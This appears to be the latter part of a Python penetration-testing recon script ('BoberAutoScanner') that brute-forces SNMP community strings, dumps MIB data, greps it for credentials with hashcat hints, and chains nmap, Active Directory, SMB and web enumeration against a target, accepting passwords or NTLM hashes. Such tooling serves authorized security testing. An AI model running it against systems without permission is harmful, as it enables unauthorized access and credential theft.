    r"(?i)passwd\s*[=:\s]\s*\S+",
    r"(?i)secret\s*[=:\s]\s*\S+",
    r"(?i)community\s*[=:\s]\s*\S+",
    r"(?i)login\s*[=:\s]\s*\S+",
    r"(?i)credential",
    r"(?i)api[_-]?key",
    r"(?i)/home/\w+",
    r"(?i)/root/",
    r"(?i)\.sh\b",
    r"(?i)backup",
    r"(?i)cron",
]


def _snmp_probe(target_ip, community, oid="1.3.6.1.2.1.1.1.0", version="2c"):
    """Single quick probe — returns True if SNMP responds."""
    result = _run(
        ["snmpwalk", f"-v{version}", "-c", community,
         "-t", "2", "-r", "1", target_ip, oid],
        timeout=8
    )
    return bool(result and result.returncode == 0 and result.stdout.strip())


def run_snmp_community_bruteforce(target_ip):
    """
    Discover valid community strings.
    Uses onesixtyone when available; falls back to sequential snmpwalk probes.
    Returns list of valid community strings.
    """
    print(f"\n{yellow('[SNMP]')} Community string bruteforce...")
    valid = []

    if check_tool("onesixtyone"):
        comm_file = "snmp_communities_wordlist.txt"
        with open(comm_file, "w") as f:
            f.write("\n".join(SNMP_COMMUNITY_STRINGS) + "\n")
        cmd = ["onesixtyone", "-c", comm_file, target_ip]
        print(f"{cyan('[CMD]')} {' '.join(cmd)}")
        result = _run(cmd, timeout=30)
        if result:
            for line in result.stdout.splitlines():
                # onesixtyone format: "ip [community] some text"
                m = re.search(r"\[([^\]]+)\]", line)
                if m:
                    comm = m.group(1).strip()
                    if comm not in valid:
                        valid.append(comm)
                        print(f"{green('[SNMP]')} Valid community: {cyan(comm)}")
        try:
            os.remove(comm_file)
        except OSError:
            pass
    else:
        warn_missing_tool("onesixtyone")
        print("[*] Falling back to sequential snmpwalk probe (top 5)...")
        for comm in SNMP_COMMUNITY_STRINGS[:5]:
            if _snmp_probe(target_ip, comm):
                valid.append(comm)
                print(f"{green('[SNMP]')} Valid community: {cyan(comm)}")

    if not valid:
        print(red("[-] No valid SNMP community strings found."))
    return valid


def run_snmpwalk_full(target_ip, community, version="2c"):
    """
    Full MIB tree walk for a validated community string.
    Saves raw output and returns it as a string.
    """
    out_file = f"snmp_{community}_full.txt"
    print(f"\n{yellow('[SNMP]')} Full MIB walk — community={cyan(community)}")
    cmd = [
        "snmpwalk", f"-v{version}", "-c", community,
        "-t", "5", "-r", "2",
        "-O", "e",
        target_ip,
    ]
    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    run_interruptible_command(cmd, "SNMPWALK")
    # Re-run silently to capture output for analysis
    result = _run(cmd, timeout=120)
    output = result.stdout if result else ""
    if output:
        with open(out_file, "w") as f:
            f.write(output)
        print(f"{green('[LOOT]')} snmpwalk full dump → {out_file}")
    return output


def run_snmp_check(target_ip, community):
    """
    Structured enumeration with snmp-check.
    Covers users, processes, services, network, software.
    """
    if not check_tool("snmp-check"):
        warn_missing_tool("snmp-check")
        return ""
    out_file = f"snmp_{community}_check.txt"
    print(f"\n{yellow('[SNMP]')} snmp-check — community={cyan(community)}")
    cmd = ["snmp-check", "-c", community, "-v", "2c", target_ip]
    print(f"{cyan('[CMD]')} {' '.join(cmd)}")
    result = _run(cmd, timeout=60)
    output = result.stdout if result else ""
    if output:
        with open(out_file, "w") as f:
            f.write(output)
        print(f"{green('[LOOT]')} snmp-check output → {out_file}")
    return output


def run_snmp_targeted_oids(target_ip, community, version="2c"):
    """
    Walk high-value OID branches individually and save combined report.
    """
    out_file = f"snmp_{community}_targeted.txt"
    print(f"\n{yellow('[SNMP]')} Targeted OID enumeration — community={cyan(community)}")
    combined = []
    for label, oid in SNMP_TARGET_OIDS:
        cmd = [
            "snmpwalk", f"-v{version}", "-c", community,
            "-t", "5", "-r", "1",
            target_ip, oid,
        ]
        print(f"  {cyan('[OID]')} {label} ({oid})")
        result = _run(cmd, timeout=30)
        if result and result.stdout.strip():
            section = f"\n{'='*60}\n[ {label} — {oid} ]\n{'='*60}\n{result.stdout}"
            combined.append(section)
            # Print first few lines as preview
            lines = result.stdout.strip().splitlines()
            for ln in lines[:5]:
                print(f"    {ln}")
            if len(lines) > 5:
                print(f"    ... ({len(lines)} lines total)")
        else:
            print(f"    {red('(no data)')}")
    if combined:
        with open(out_file, "w") as f:
            f.write("\n".join(combined))
        print(f"{green('[LOOT]')} Targeted OID report → {out_file}")
    return "\n".join(combined)


def hunt_snmp_credentials(full_dump, community):
    """
    Grep the full SNMP dump for credential-like patterns.
    Saves hits to snmp_cred_hints.txt with hashcat hint where relevant.
    """
    if not full_dump:
        return
    hits = []
    for line in full_dump.splitlines():
        if any(re.search(p, line) for p in SNMP_CRED_PATTERNS):
            hits.append(line.strip())

    if hits:
        out = f"snmp_{community}_cred_hints.txt"
        with open(out, "w") as f:
            f.write("\n".join(hits) + "\n")
        print(f"\n{green('[LOOT]')} SNMP credential hints → {out}")
        for h in hits[:15]:
            print(f"  {yellow('>>>')} {h}")
        if len(hits) > 15:
            print(f"  ... and {len(hits) - 15} more → see {out}")
        # Hashcat hints for common hash patterns in SNMP
        for h in hits:
            if re.search(r"\$1\$", h):
                print(f"  {yellow('[HINT]')} MD5crypt detected → hashcat -m 500")
            elif re.search(r"\$5\$", h):
                print(f"  {yellow('[HINT]')} SHA-256crypt detected → hashcat -m 7400")
            elif re.search(r"\$6\$", h):
                print(f"  {yellow('[HINT]')} SHA-512crypt detected → hashcat -m 1800")
            elif re.search(r"^[a-fA-F0-9]{32}$", h.split()[-1]):
                print(f"  {yellow('[HINT]')} Possible MD5 hash → hashcat -m 0")
    else:
        print("[*] No credential patterns found in SNMP dump.")


def _execute_snmp_with_communities(target_ip, valid_communities, auto_mode):
    """Inner loop: run full SNMP pipeline for each valid community string."""
    for community in valid_communities:
        print(f"\n{magenta('─' * 50)}")
        print(f"{magenta(f'[SNMP] Community: {community}')}")
        print(f"{magenta('─' * 50)}")

        full_dump = run_snmpwalk_full(target_ip, community)
        run_snmp_check(target_ip, community)
        run_snmp_targeted_oids(target_ip, community)
        hunt_snmp_credentials(full_dump, community)

    print(f"\n{green('[+]')} SNMP enumeration complete.\n")


def execute_snmp_enumeration(target_ip, auto_mode):
    """
    Full SNMP enumeration pipeline:
      1. Community string bruteforce (onesixtyone / fallback)
      2. Full MIB walk (snmpwalk)
      3. snmp-check structured output
      4. Targeted high-value OIDs
      5. Credential hunting in dump
    Only runs if UDP 161 was detected in port_list or --snmp flag set.
    """
    print(f"\n{green('[+]')} SNMP service detected — starting enumeration.")
    valid_communities = run_snmp_community_bruteforce(target_ip)
    if not valid_communities:
        return
    _execute_snmp_with_communities(target_ip, valid_communities, auto_mode)


# ============================================================
# AD TIME SYNC
# ============================================================

def sync_time_with_dc(dc_host, auto_mode):
    if not dc_host:
        print("[*] No DC discovered. Skipping time sync.")
        return
    print(f"\n{white('[!] Kerberos is sensitive to time drift.')}")
    print(f"{white('[!] Sync with DC to avoid KRB_AP_ERR_SKEW errors.')}\n")
    if not ask_user(f"Sync system time with DC ({dc_host})? [y/N]: ",
                    default="yes", auto_mode=auto_mode):
        print("[*] Time sync skipped.")
        return
    print(f"\n[*] Syncing with {dc_host}")
    subprocess.run(["sudo", "timedatectl", "set-ntp", "false"])
    subprocess.run(["sudo", "rdate", "-nv", dc_host])
    print(f"{white('[+] Time sync complete.')}\n")


# ============================================================
# JSON SUMMARY REPORT (NEW)
# ============================================================

def write_json_summary(target_ip, ports, ad_core, web_map, validated_targets):
    summary = {
        "target_ip":   target_ip,
        "timestamp":   time.strftime("%Y-%m-%dT%H:%M:%S"),
        "open_ports":  ports.split(",") if ports else [],
        "ad": {
            "dns_domain": ad_core.get("dns_domain") if ad_core else None,
            "dc_hosts":   list(ad_core.get("dc_hosts", set())) if ad_core else [],
        },
        "web_map": {
            domain: {"ports": list(d["ports"]), "schemes": list(d["schemes"])}
            for domain, d in web_map.items()
        },
        "validated_web_targets": [
            {"host": t["host"], "port": t["port"], "scheme": t["scheme"]}
            for t in validated_targets
        ],
        "snmp_files": sorted(
            f for f in os.listdir(".")
            if f.startswith("snmp_") and f.endswith(".txt")
        ),
        "loot_files": sorted(
            f for f in os.listdir(".")
            if f.endswith((".txt", ".json", ".zip")) and f != "scan_summary.json"
        ),
    }
    out = "scan_summary.json"
    with open(out, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"\n{magenta('[REPORT]')} JSON summary → {out}")


# ============================================================
# MAIN
# ============================================================

def main():
    try:
        parser = argparse.ArgumentParser(
            description="BoberAutoScanner – Turbocharged Edition",
            formatter_class=argparse.RawTextHelpFormatter,
        )
        parser.add_argument("target",             help="Target IP address")
        parser.add_argument("-u", "--username",   help="Username")
        parser.add_argument("-p", "--password",   help="Password")
        parser.add_argument("-H", "--hash",       help="NTLM hash  (:NT  or  LM:NT)")

        parser.add_argument("-sn", "--skip-nmap",
            action="store_true",
            help="Skip RustScan/Nmap (use existing scan files)")

        parser.add_argument("-spu", "--skip-passwordless-users",
            action="store_true",
            help="Skip anonymous and guest auth rounds")

        parser.add_argument("-csr", "--create-smb-report",
            action="store_true",
            help="Create extended SMB report (needs high privileges)")

        parser.add_argument("-wfs", "--wordlist-for-subdomain",
            help="Wordlist for virtual host fuzzing")

        parser.add_argument("-wfe", "--wordlist-for-endpoints",
            help="Wordlist for endpoint fuzzing")

        parser.add_argument("--nuclei",
            action="store_true",
            help="Run nuclei against discovered web targets")

        parser.add_argument("--cve",
            action="store_true",
            help="CVE lookup for detected software versions (searchsploit + NVD API)")

        parser.add_argument("--no-auto",
            action="store_true",
            help="Disable auto-timeout answers (fully interactive)")

        parser.add_argument("--crawler-active-mode",
            action="store_true",
            help="Enable bober-crawler active mode")

        parser.add_argument("--crawler-check-vulnerabilities",
            action="store_true",
            help="Enable bober-crawler vulnerability checks")

        parser.add_argument("--snmp",
            action="store_true",
            help="Force SNMP enumeration even if UDP 161 not in TCP scan results")

        parser.add_argument("--snmp-community",
            dest="snmp_community",
            default=None,
            help="Use specific SNMP community string (skips bruteforce)")

        parser.add_argument("-o", "--output-dir",
            default=None,
            help="Output directory (default: <target_ip>_scan/)")

        args = parser.parse_args()

        target_ip  = args.target
        username   = args.username
        password   = args.password
        hash_value = args.hash
        auto_mode  = not args.no_auto

        # ── Auth validation ──────────────────────────────────
        if username and password is None and hash_value is None:
            print(red("[!] Provide -p (password) or -H (hash) together with -u."))
            sys.exit(1)
        if (password or hash_value) and username is None:
            print(red("[!] Provide -u (username) together with -p/-H."))
            sys.exit(1)
        if password and hash_value:
            print(red("[!] Use either -p or -H, not both."))
            sys.exit(1)

        # ── Output directory ─────────────────────────────────
        output_dir = args.output_dir or f"{target_ip}_scan"
        os.makedirs(output_dir, exist_ok=True)
        os.chdir(output_dir)
        print(f"{white('[*]')} Working directory: {os.getcwd()}")

        # ────────────────────────────────────────────────────
        # NMAP PHASE
        # ────────────────────────────────────────────────────
        print_section_title("Nmap Phase", "37")
        if not args.skip_nmap:
            rust_output = run_rustscan(target_ip)
            ports       = extract_ports(rust_output, target_ip)
            run_nmap_basic(target_ip, ports)
            run_nmap_full(target_ip, ports)
        else:
            print("\n[*] Skipping Nmap phase (--skip-nmap)")
            # FIX: check BOTH required files when skipping nmap
            missing = [f for f in ["nmap_all-ports_basic-info_TCP.txt",
                                    "nmap_all-ports_all-info_TCP.txt",
                                    "rustscan_all-ports_TCP.txt"]
                       if not os.path.exists(f)]
            if missing:
                print(red(f"[!] Required files missing: {', '.join(missing)}"))
                sys.exit(1)
            ports = extract_ports("rustscan_all-ports_TCP.txt", target_ip)

        # ────────────────────────────────────────────────────
        # UDP SCAN
        # ────────────────────────────────────────────────────
        print_section_title("UDP Port Scan", "37")
        open_udp_ports = set()
        if not args.skip_nmap:
            open_udp_ports = run_nmap_udp(target_ip)
        else:
            # If skip-nmap and udp file already exists, parse it
            if os.path.exists("nmap_udp_scan.txt"):
                with open("nmap_udp_scan.txt", "r", errors="ignore") as f:
                    for line in f:
                        m = re.match(r"^\s*(\d+)/udp\s+open\s+", line)
                        if m:
                            open_udp_ports.add(m.group(1))
                if open_udp_ports:
                    print(f"[*] Loaded UDP results from existing file: {cyan(', '.join(sorted(open_udp_ports, key=int)))}")
            else:
                print("[*] Skipping UDP scan (--skip-nmap, no existing udp file)")

        # ────────────────────────────────────────────────────
        # DOMAIN DISCOVERY
        # ────────────────────────────────────────────────────
        print_section_title("Domain & Target Discovery", "37")
        port_list        = ports.split(",")
        ad_core          = None
        web_map          = {}
        nmap_full_output = "nmap_all-ports_all-info_TCP.txt"

        if "389" in port_list:
            ad_core = discover_ad_via_ldap(target_ip)

        web_map = discover_web_domains(nmap_full_output, target_ip)

        global_domains = build_global_domain_list(ad_core, web_map, nmap_full_output)

        if global_domains:
            print("\n[!] Discovered domains:")
            for d in sorted(global_domains):
                print(f"  - {d}")
            print(f"\n{white('[!]')} Updating /etc/hosts may affect Nmap resolution.")
            print(f"    {white('After updating, use --skip-nmap on subsequent runs.')}\n")
            if ask_user("Update /etc/hosts with discovered domains? [y/N]: ",
                        default="yes", auto_mode=auto_mode):
                update_hosts_file(target_ip, global_domains)
            else:
                print("[*] Hosts update skipped.")
        else:
            print("[*] No domains discovered.")

        # ────────────────────────────────────────────────────
        # AD / WINDOWS ENUMERATION
        # ────────────────────────────────────────────────────
        print_section_title("Active Directory & Windows Enumeration", "37")
        windows_likely = is_windows_likely(port_list)

        if windows_likely:
            print(f"\n{green('[+]')} Windows/AD environment detected.")
        else:
            print("\n[*] No strong Windows indicators.")

        if windows_likely:
            dc_host = None
            if ad_core:
                if ad_core.get("dc_hosts"):
                    dc_host = next(iter(ad_core["dc_hosts"]))
            if not dc_host:
                print("[*] No DC hostname found.")

            sync_time_with_dc(dc_host, auto_mode)

            execute_windows_strategy(
                target_ip, username, password,
                args.skip_passwordless_users,
                args.create_smb_report,
                dc_host,
                hash_value=hash_value,
            )

        # ────────────────────────────────────────────────────
        # SNMP ENUMERATION
        # ────────────────────────────────────────────────────
        print_section_title("SNMP Enumeration", "37")

        # SNMP runs only when UDP 161 or 162 is confirmed OPEN
        # (not open|filtered — too many false positives on UDP)
        snmp_udp_open = bool(open_udp_ports & {"161", "162"})
        snmp_likely   = snmp_udp_open or args.snmp

        if snmp_likely:
            if snmp_udp_open:
                found = open_udp_ports & {"161", "162"}
                print(f"{green('[+]')} SNMP port(s) confirmed open via UDP scan: {cyan(', '.join(sorted(found)))}")
            else:
                print(f"{yellow('[!]')} SNMP forced via --snmp flag (no UDP scan confirmation)")

            if check_tool("snmpwalk"):
                if args.snmp_community:
                    print(f"{white('[*]')} Using provided community: {cyan(args.snmp_community)}")
                    _execute_snmp_with_communities(target_ip, [args.snmp_community], auto_mode)
                else:
                    execute_snmp_enumeration(target_ip, auto_mode)
            else:
                warn_missing_tool("snmpwalk")
                print("[*] Install: sudo apt install snmp snmp-mibs-downloader snmpcheck onesixtyone")
        else:
            print("\n[*] UDP 161/162 not open — SNMP enumeration skipped.")
            print(f"    {yellow('[TIP]')} Force with --snmp  or  --snmp-community public")

        # ────────────────────────────────────────────────────
        # WEB ENUMERATION
        # ────────────────────────────────────────────────────
        print_section_title("Web Service & Application Enumeration", "37")
        validated_targets = build_validated_web_targets(web_map, target_ip)

        print("\n=== VALID WEB TARGET LIST ===")
        if not validated_targets:
            print("[*] No valid web services detected.")
        else:
            for t in validated_targets:
                print(f"{green('[+]')} {t['scheme']}://{t['host']}:{t['port']}")
            process_web_targets(
                validated_targets,
                args.wordlist_for_subdomain,
                target_ip,
                args.wordlist_for_endpoints,
                auto_mode,
                run_nuclei=args.nuclei,
                run_cve=args.cve,
                crawler_active_mode=args.crawler_active_mode,
                crawler_check_vulnerabilities=args.crawler_check_vulnerabilities,
            )

        # ────────────────────────────────────────────────────
        # JSON SUMMARY
        # ────────────────────────────────────────────────────
        write_json_summary(target_ip, ports, ad_core, web_map, validated_targets)
        print(f"\n{green('[+]')} BoberAutoScanner finished.\n")

    except KeyboardInterrupt:
        print(f"\n\n{red('[!]')} Global interrupt.")
        print("[*] Exiting cleanly.\n")
        sys.exit(0)
